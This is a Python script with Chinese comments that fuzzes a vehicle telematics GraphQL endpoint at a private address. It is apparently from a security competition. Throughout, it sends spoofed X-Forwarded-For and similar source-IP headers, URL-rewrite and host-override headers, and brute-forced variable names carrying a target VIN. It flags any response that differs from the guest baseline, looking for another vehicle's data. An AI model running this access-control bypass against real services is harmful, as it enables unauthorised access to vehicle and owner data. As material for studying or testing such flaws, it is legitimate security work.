"""E3: 身份通道穷举。
假设 H1: TSP 按来源 IP（X-Forwarded-For / X-Real-IP / Forwarded）识别设备/T-BOX。
假设 H2: 对象选择靠 variables 里的某个键名（未在 lead 的 fuzz 范围内）。
判据：任何一条响应 body != BASELINE 即命中。
"""
import json, time, urllib.request, urllib.error, itertools

URL = "http://10.230.164.2:8080/graphql"
BASE = b'{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN = "CV6FF52FEE9EDDD86"

def post(body, headers=None, label="", url=URL):
    data = body if isinstance(body, bytes) else json.dumps(body).encode()
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    r = urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            rb = resp.read(); code = resp.status
    except urllib.error.HTTPError as e:
        rb = e.read(); code = e.code
    except Exception as e:
        return {"label": label, "err": str(e)}
    return {"label": label, "status": code, "sha": __import__("hashlib").sha256(rb).hexdigest()[:12],
            "body": rb.decode("utf-8", "replace")[:300], "hit": rb != BASE}

results = []
def rec(r):
    results.append(r)
    if r.get("hit"):
        print("HIT ", r)
    return r

# ---- H1: 来源 IP / 代理头
ip_srcs = ["10.230.164.3", "10.230.164.4", "10.230.164.2", "127.0.0.1", "::1", "10.0.0.1",
           "172.16.0.1", "192.168.1.1", "10.230.164.3, 10.230.164.2"]
hdrs = ["X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP", "Client-IP",
        "X-Remote-Addr", "X-Proxy-User-IP", "True-Client-IP", "CF-Connecting-IP"]
for h, ip in itertools.product(hdrs, ip_srcs):
    rec(post({"query": "{vehicles{vin}}"}, {h: ip}, f"H1 {h}={ip}"))

for fwd in [f"for={VIN}", f"for=10.230.164.3", f"for=10.230.164.3;proto=https",
            f"for={VIN};host=tsp"]:
    rec(post({"query": "{vehicles{vin}}"}, {"Forwarded": fwd}, f"H1 Forwarded:{fwd}"))

# ---- H1b: 路径重写/主机覆盖头
for h, v in [("X-Original-URL", "/internal/graphql"), ("X-Rewrite-URL", "/internal/graphql"),
             ("X-Forwarded-Host", "tsp"), ("X-Forwarded-Prefix", "/api"),
             ("X-HTTP-Method-Override", "POST"), ("X-Method-Override", "POST")]:
    rec(post({"query": "{vehicles{vin}}"}, {h: v}, f"H1b {h}"))

# ---- H2: variables 键名穷举
VKEYS = """
vin VIN Vin vehicleVin vehicle_vin vehicleId vehicle_id vehicle vid target targetVin target_vin
id ID ids target_id targetId current currentVin current_vin selected select sel
tbox tboxId tbox_id device deviceId device_id sn serial imei iccid msisdn
tenant tenantId tenant_id account accountId account_id user user_id uid sub
scope filter where query args input params vars payload data req request
vehicleFilter vinList vins targets multi
owner ownerVin custodian holder subject principal identity role fleet fleetId
queryVin lookupVin lookup key value name node nodeId resource resourceId object objectId
"""
VKEYS = sorted(set(VKEYS.split()))
for k in VKEYS:
    rec(post({"query": "query($v:String){vehicles(vin:$v){vin label}}", "variables": {k: VIN}}, {}, f"H2 var.{k}"))

# ---- H3: variables 值类型（探 map[string]interface{} 还是 map[string]string）
for vt, v in [("obj", {"a": 1}), ("num", 1), ("bool", True), ("arr", ["a"]), ("null", None)]:
    rec(post({"query": "{vehicles{vin}}", "variables": {"x": v}}, {}, f"H3 variables.x={vt}"))

# ---- H4: query 字符串本身被二次解析
for q in ['{"vin":"%s"}' % VIN, 'vehicles', 'vehicle', 'ota', 'campaign', 'diagnostics',
          '{"operation":"vehicles","vin":"%s"}' % VIN,
          '{"op":"vehicle.get","args":{"vin":"%s"}}' % VIN,
          '%s' % VIN, '{"query":"{vehicles{vin}}","vin":"%s"}' % VIN]:
    rec(post({"query": q}, {}, f"H4 query={q[:40]}"))

diffs = [r for r in results if r.get("hit")]
print(f"\ntotal={len(results)} hits={len(diffs)}")
for r in diffs: print(r)
json.dump({"total": len(results), "hits": diffs, "results": results},
          open(r"D:\qwb\03_EVIDENCE\tsp\0202_e3_identity_channels.json", "w", encoding="utf-8"),
          ensure_ascii=False, indent=1)
